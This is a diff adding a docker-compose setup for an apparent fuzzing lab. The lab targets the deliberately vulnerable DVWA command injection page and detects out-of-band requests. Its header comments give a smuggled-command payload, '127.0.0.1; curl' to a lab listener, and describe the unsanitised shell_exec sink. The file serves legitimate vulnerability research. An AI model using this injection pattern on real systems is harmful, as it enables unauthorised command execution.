@@ -1,0 +1,102 @@
+name: phuzz-dvwa-cmdi
+
+# DVWA Command Injection → SSRF
+# Security level: low (no sanitisation on 'ip' param)
+# Endpoint: POST /vulnerabilities/exec/ { ip=<payload>, Submit=Submit }
+# Shell: shell_exec('ping  -c 4 ' . $target)
+# Injection: 127.0.0.1; curl http://172.20.0.10:8000/<token>
+# Detection: uopz hook on shell_exec (08_ssrf.php) → ssrf-hooks/<covID>.json
+
+services:
+
+  phuzz-oob:
+    build:
+      context: ./oob
+      dockerfile: Dockerfile
+    volumes:
+      - shared-tmpfs:/shared-tmpfs
+    networks:
+      phuzz-net:
+        ipv4_address: 172.20.0.10
+
+  phuzz-db:
+    image: mysql:8
+    command: mysqld
+    environment:
+      MYSQL_DATABASE:      db
+      MYSQL_USER:          user
+      MYSQL_PASSWORD:      password
+      MYSQL_ROOT_PASSWORD: password
+      MYSQL_ROOT_HOST:     "%"
+    networks:
+      phuzz-net:
+        aliases: [db]
+
+  phuzz-web:
+    build:
+      context: ./web
+      dockerfile: Dockerfile
+    environment:
+      APPLICATION_TYPE:     dvwa
+      FUZZER_COVERAGE_PATH: /var/www/html/
+      FUZZER_COMPRESS:      0
+      REQUIRES_DB:          1
+    volumes:
+      - ./web/applications:/applications/
+      - shared-tmpfs:/shared-tmpfs
+    ports:
+      - "8082:80"
+    extra_hosts:
+      - "oob.phuzz:172.20.0.10"
+    networks:
+      phuzz-net:
+        aliases: [web]
+    depends_on: [phuzz-db, phuzz-oob]
+    healthcheck:
+      test: ["CMD", "test", "-f", "/shared-tmpfs/web-paths.txt"]
+      interval: 5s
+      timeout: 3s
+      retries: 60
+      start_period: 20s
+
+  phuzz-fuzzer-1:
+    build:
+      context: ./fuzzer
+      dockerfile: Dockerfile
+    environment:
+      PYTHONUNBUFFERED: 1
+      FUZZER_NODE_ID:   1
+      FUZZER_CONFIG:    dvwa/cmdi_ssrf
+      FUZZER_CLEANUP:   1
+      FUZZER_COMPRESS:  0
+    volumes:
+      - ./fuzzer:/app
+      - shared-tmpfs:/shared-tmpfs
+      - sync-tmpfs:/sync-tmpfs
+    depends_on:
+      phuzz-web:
+        condition: service_healthy
+      phuzz-oob:
+        condition: service_started
+    networks: [phuzz-net]
+
+volumes:
+  shared-tmpfs:
+    driver: local
+    driver_opts:
+      type: tmpfs
+      device: tmpfs
+      o: "size=512m,uid=1000"
+  sync-tmpfs:
+    driver: local
+    driver_opts:
+      type: tmpfs
+      device: tmpfs
+      o: "size=256m,uid=1000"
+
+networks:
+  phuzz-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.20.0.0/24
